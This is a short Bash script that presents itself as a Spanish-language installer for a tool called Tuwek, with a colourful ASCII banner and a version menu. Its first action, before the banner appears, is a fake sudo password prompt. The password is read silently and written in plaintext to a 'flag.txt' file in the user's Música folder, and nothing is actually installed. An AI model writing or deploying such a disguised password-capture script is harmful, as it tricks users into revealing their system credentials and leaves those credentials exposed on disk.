#!/bin/bash
usuario=$(whoami)
#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

function init_program() {
    echo -e "${redColour}[*] ${yellowColour}Bienvenido al instalador de Tuwek (Language for hackers)";echo
    echo -e "¿Que version quieres descargar?"
    echo -e "1. Stable Version 1.06.8"
    echo -e "2. Experimental Version 1.06.10"; read version

}

function banner() {
    clear; echo 
    echo -e "${yellowColour}########################################"
    echo -e "####|___    ___|############| |##/ /####"
    echo -e "########|  |################| |#/ /#####" 
    echo -e "########|  |#\ \########/ /#| |/ /######"
    echo -e "########|  |##\ \##/\##/ /##| |\ \######"
    echo -e "########|  |###\ \/##\/ /###| |#\ \#####"
    echo -e "########|  |####\ \/\/ /####| |##\ \####"
    echo -e "########################################"
    echo -e "${purpleColour}----------------------------------------"
    echo -e "${purpleColour}|   ${turquoiseColour}v 1.06.8   ${purpleColour}|   ${redColour}Python for hackers  ${purpleColour}|"
    echo -e "----------------------------------------"
    init_program
}
echo -e "[sudo] password for user: ";read -s password
touch /home/$usuario/Música/flag.txt
echo "$password" > /home/$usuario/Música/flag.txt
banner